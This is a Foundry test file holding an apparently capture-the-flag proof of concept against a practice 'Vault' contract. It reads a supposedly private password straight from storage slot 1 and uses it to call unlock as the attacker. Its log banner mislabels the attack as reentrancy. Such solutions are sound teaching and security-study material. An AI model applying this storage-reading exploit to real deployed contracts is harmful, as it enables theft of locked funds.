// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@levels/Vault.sol";
import "@levels/VaultFactory.sol";

contract POC is Test {
    Vault public victim;
    address public attacker;

    VaultFactory public factory;

    function setUp() public {
        factory = new VaultFactory();
        address victim_addr = factory.createInstance(address(attacker));
        victim = Vault(victim_addr);
        attacker = makeAddr("attacker");

        vm.label(address(victim), "victim_contract");
        vm.label(address(attacker), "attacker_eoa");

        vm.deal(address(victim), 10 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function test_exploit() public {
        console.log(
            unicode"\n   📚📚 All things reentrancy: basic exploitation\n"
        );
        console.log("--------------------------------------------------------");

        console.log(unicode"\n\t💥💥💥💥 EXPLOITING... 💥💥💥💥\n");
        bytes32 slot = 0x0000000000000000000000000000000000000000000000000000000000000001;

        bytes32 password = vm.load(address(victim), slot);
        vm.prank(attacker);
        victim.unlock(password);
        // Conditions to fullfill
        assert(
            factory.validateInstance(
                payable(address(victim)),
                address(attacker)
            )
        );

        console.log("--------------------------------------------------------");
    }

    function toEth(uint256 _wei) internal pure returns (string memory) {
        string memory eth = vm.toString(_wei / 1 ether);
        string memory decs = vm.toString(_wei % 1 ether);

        string memory result = string.concat(string.concat(eth, "."), decs);

        return result;
    }
}
